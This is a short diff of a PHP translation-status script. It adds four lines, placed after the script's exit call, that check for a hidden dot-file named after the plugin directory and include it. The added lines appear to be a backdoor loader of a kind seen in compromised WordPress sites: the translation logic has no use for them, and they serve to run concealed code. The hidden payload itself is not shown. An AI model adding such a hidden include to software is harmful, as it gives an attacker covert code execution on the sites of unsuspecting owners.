@@ -81,6 +81,10 @@ foreach ($config['original_files'] as $originalFilePath) {
 
 exit($totalMissingTranslations > 0 ? 1 : 0);
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function findTranslationFiles($originalFilePath, $localeToAnalyze)
 {
     $translations = [];
